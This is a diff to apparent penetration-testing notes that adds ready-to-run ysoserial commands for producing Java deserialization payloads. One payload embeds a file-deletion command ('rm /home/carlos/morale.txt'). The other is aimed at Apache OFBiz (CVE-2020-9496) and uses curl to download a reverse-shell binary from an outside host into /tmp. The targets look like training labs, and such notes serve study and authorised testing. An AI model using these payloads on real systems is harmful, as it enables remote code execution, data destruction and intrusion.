@@ -45,7 +45,16 @@ wine ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 
 
 <summary>yseoserial-all.jar Running Natively on Linux</summary>
 
+Download ysoserial-all.jar from [https://github.com/frohoff/ysoserial/releases](https://github.com/frohoff/ysoserial/releases)
+
 ```shellscript
+java \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+   --add-opens=java.base/java.net=ALL-UNNAMED \
+   --add-opens=java.base/java.util=ALL-UNNAMED \
+   -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | tr -d "\n"
+
 # Apache OFBiz 17.12.01 is vuln to XML RPC Java deserialization attack (CVE-2020-9496) 
 java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED      --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED      --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED      --add-opens=java.base/java.util=ALL-UNNAMED      -jar ./ysoserial-all.jar CommonsBeanutils1 "curl http://10.10.14.36/rev -o /tmp/rev3" | base64 | tr -d "\n"
 ```
